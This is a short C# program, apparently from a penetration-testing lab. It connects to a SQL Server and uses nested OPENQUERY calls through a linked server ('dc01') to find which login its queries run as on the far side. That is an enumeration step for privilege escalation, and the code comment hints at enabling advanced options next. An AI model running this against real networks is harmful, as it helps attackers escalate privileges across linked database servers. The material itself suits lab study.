using System;
using System.Data.SqlClient;

namespace linkenum
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";

            //The default database in MS SQL is called “master”
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

           
            String execmd = "select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\", ''select SYSTEM_USER as mylogin'')')";

            //enable advanced options on dc1
            SqlCommand command = new SqlCommand(execmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read()) {

                Console.WriteLine("Executing as login" + reader[0]);
       
            }
            reader.Close();

            con.Close();


        }
    }
}
